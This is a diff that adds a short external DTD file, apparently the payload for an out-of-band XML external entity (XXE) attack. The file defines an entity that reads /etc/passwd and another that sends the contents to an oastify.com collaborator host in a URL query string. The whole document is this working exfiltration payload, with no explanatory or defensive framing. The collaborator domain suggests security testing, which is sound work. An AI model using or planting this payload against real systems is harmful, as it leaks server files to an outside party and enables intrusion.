@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://k2n0co3zmadw0yma0koithcgv71ypydn.oastify.com/?x=%file;'>">
+%exfil;
+%send;
